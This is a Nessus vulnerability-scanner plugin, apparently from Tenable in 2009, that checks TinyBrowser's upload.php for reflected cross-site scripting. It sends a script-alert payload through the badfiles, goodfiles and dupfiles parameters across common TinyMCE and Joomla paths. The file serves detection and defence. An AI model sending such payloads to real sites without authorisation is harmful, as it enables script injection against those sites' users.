#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(40493);
  script_version("$Revision: 1.1 $");

  script_bugtraq_id(35855);
  script_xref(name:"milw0rm",value:"9296");
  script_xref(name:"OSVDB",value:"56602");
  script_xref(name:"Secunia",value:"36031");

  script_name(english:"TinyBrowser Multiple Flaws");
  script_summary(english:"Checks for an XSS flaw in upload.php");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote web server contains a PHP application that is affected by a\n",
      "cross-site scripting issue."
    )
  );
  script_set_attribute(
    attribute:"description", 
    value:string(
"TinyBrowser, an open source web file browser is installed on the
remote system.  TinyBrowser is typically bundled with web applications
such as TinyMCE WYSIWYG content editor and Joomla! content management
system, although it can also be used in its standalone configuration
or integrated with custom web applications. 

The installed version fails to sanitize input passed to 'goodfiles',
'badfiles' and 'dupfiles' parameters in the '/tinybrowser/upload.php'
script before using it to generate dynamic HTML content.  An
unauthenticated remote attacker may be able to leverage this issue to
inject arbitrary HTML or script code into a user's browser to be
executed within the security context of the affected site. 

The installed version is likely to be affected by several other
vulnerabilities, although Nessus has not checked for them.  These
could allow an unauthenticated user to view, upload, delete, and
rename files and folders on the affected host or to launch cross-site
request forgeries attacks using the application.")
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://yehg.net/lab/pr0js/advisories/tinybrowser_1416_multiple_vulnerabilities"
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://archives.neohapsis.com/archives/fulldisclosure/2009-07/0463.html"
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://archives.neohapsis.com/archives/fulldisclosure/2009-07/0465.html"
  );
  script_set_attribute(
    attribute:"solution", 
    value:
"Unknown if TinyBrowser is used in standalone configuration.  If used
with Joomla! 1.5.12 upgrade to Joomla! version 1.5.13."
  );
  script_set_attribute(
    attribute:"cvss_vector", 
    value:"CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N"
  );
  script_set_attribute(attribute:"vuln_publication_date", value:"2009/07/27");
  script_set_attribute(attribute:"vuln_publication_date", value:"2009/07/22");
  script_set_attribute(attribute:"plugin_publication_date", value:"2009/08/05");

  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_dependencies("http_version.nasl", "cross_site_scripting.nasl","joomla_detect.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");

port =  get_http_port(default:80);
if (!can_host_php(port:port))  exit(0,"Remote web server does not support PHP.");
if (get_kb_item("www/"+port+"/generic_xss")) exit(1,"Generic XSS KB is already set.");

# Get Joomla install directory

joomla_dir = NULL;

install = get_kb_item(string("www/", port, "/joomla"));

if (!isnull(install))
{
 matches = eregmatch(string:install, pattern:"^.+ under (/.*)$");
 if (!isnull(matches))
   joomla_dir = matches[1];
}

if (thorough_tests) 
dirs = list_uniq(make_list(
                           "/tinymce3/jscripts/tiny_mce/plugins",
                           "/tiny_mce/plugins",
                           "/plugins/editors/tinymce/jscripts/tiny_mce/plugins",
                           "/joomla/plugins/editors/tinymce/jscripts/tiny_mce/plugins",
                           "/tinymce/jscripts/tiny_mce/plugins",
                           cgi_dirs()));
else
  dirs = make_list(cgi_dirs());

if(!isnull(joomla_dir))
 dirs = make_list(dirs,string(joomla_dir,"/plugins/editors/tinymce/jscripts/tiny_mce/plugins"));

foreach dir (list_uniq(dirs))
{
  dir = string(dir, "/tinybrowser");
  # Try to exploit the flaw.

  xss = string('1><script>alert(',"'",SCRIPT_NAME,"'",')</script>');
  exploit = string(dir,"/upload.php?badfiles=",xss); 

  res = http_send_recv3(port:port, method:"GET", item:exploit);
  if (isnull(res)) exit(1, "Null response for upload.php request.");

  if( thorough_tests && xss >!< res[2] )
  {
    exploit = string(dir,"/upload.php?goodfiles=",xss); 
    res = http_send_recv3(port:port, method:"GET", item:exploit);

    if(xss >!< res[2])
    {
      exploit = string(dir,"/upload.php?dupfiles=",xss); 
      res = http_send_recv3(port:port, method:"GET", item:exploit);
    }
  } 

  if((string('div class="alertfailure">',xss) >< res[2] && '>Upload Files<' >< res[2]) ||
     (string('div class="alertsuccess">',xss) >< res[2] && '>Upload Files<' >< res[2]) 
    )
  {
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
 
    if (report_verbosity > 0)
    { 
      report = string(
        "\n",
        "Nessus was able to exploit the cross-site scripting flaw using the following URL :\n",
        "\n",
        "  ", build_url(port:port, qs:exploit), "\n"
      );
        security_warning(port:port, extra:report);
    }
    else security_warning(port);
    exit(0);
  }
} 
